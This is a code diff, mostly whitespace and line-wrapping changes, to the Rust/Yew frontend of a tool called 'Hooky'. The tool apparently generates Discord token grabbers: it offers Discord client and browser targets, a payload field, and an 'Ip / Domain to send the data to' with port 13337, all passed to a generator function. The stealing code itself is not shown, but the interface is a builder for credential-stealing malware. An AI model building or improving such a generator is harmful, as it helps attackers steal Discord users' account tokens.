@@ -5,21 +5,25 @@ use yew::prelude::*;
 #[wasm_bindgen(module = "/public/glue.js")]
 extern "C" {
     #[wasm_bindgen(js_name = invokeGen, catch)]
-    async fn gen(features: Vec<JsValue>, payload: JsValue, send_to: JsValue) -> Result<JsValue, JsValue>;
-    
+    async fn gen(
+        features: Vec<JsValue>,
+        payload: JsValue,
+        send_to: JsValue,
+    ) -> Result<JsValue, JsValue>;
+
     #[wasm_bindgen(js_name = isOn, catch)]
     async fn is_on(id: String) -> Result<JsValue, JsValue>;
-    
+
     #[wasm_bindgen(js_name = getPayload, catch)]
     async fn getPayload() -> Result<JsValue, JsValue>;
-    
+
     #[wasm_bindgen(js_name = setPayload)]
     async fn setPayload();
-    
+
     #[wasm_bindgen(js_name = getIp, catch)]
     async fn getIp() -> Result<JsValue, JsValue>;
 }
-    
+
 #[function_component(App)]
 pub fn app() -> Html {
     let types: Vec<&str> = vec!["discord-client", "discord-chromium", "discord-firefox"];
@@ -35,10 +39,17 @@ pub fn app() -> Html {
                     features.push(JsValue::from_str(i));
                 }
             }
-            let _ = gen(features, getPayload().await.unwrap_or(JsValue::null()), getIp().await.unwrap_or(JsValue::from_str("127.0.0.1:13337"))).await;
+            let _ = gen(
+                features,
+                getPayload().await.unwrap_or(JsValue::null()),
+                getIp()
+                    .await
+                    .unwrap_or(JsValue::from_str("127.0.0.1:13337")),
+            )
+            .await;
         });
     });
-    
+
     let payload_button = Callback::from(move |_| {
         spawn_local(async move {
             setPayload().await;
@@ -50,7 +61,7 @@ pub fn app() -> Html {
     html! {
         <>
         <div id={"GenCover"}>
-            <div id={"loading"}>    
+            <div id={"loading"}>
                 <img src="/public/loading.svg" width="200px" height="200px" />
             </div>
         </div>
@@ -66,17 +77,17 @@ pub fn app() -> Html {
             <div class="row">
                 <img src="public/hooky.svg" class="logo hooky" alt="Hooky"/>
             </div>
-                        
+
             <label for={"payload"}>{"Payload (Optional)"}</label>
             <input type="text" id={"payload"} />
             <button type="button" onclick={payload_button}>{"Open"}</button>
-            
+
             <label for={"ip"}>{"Ip / Domain to send the data to"}</label>
             <input type="text" value={"0.0.0.0"} id={"ip"} />
-            
+
             <label for={"port"}>{"Port to send the data to"}</label>
             <input type="number" value={13337} id={"port"} />
-            
+
             {
                 for types.iter().map(|i| {
                         id+=1;
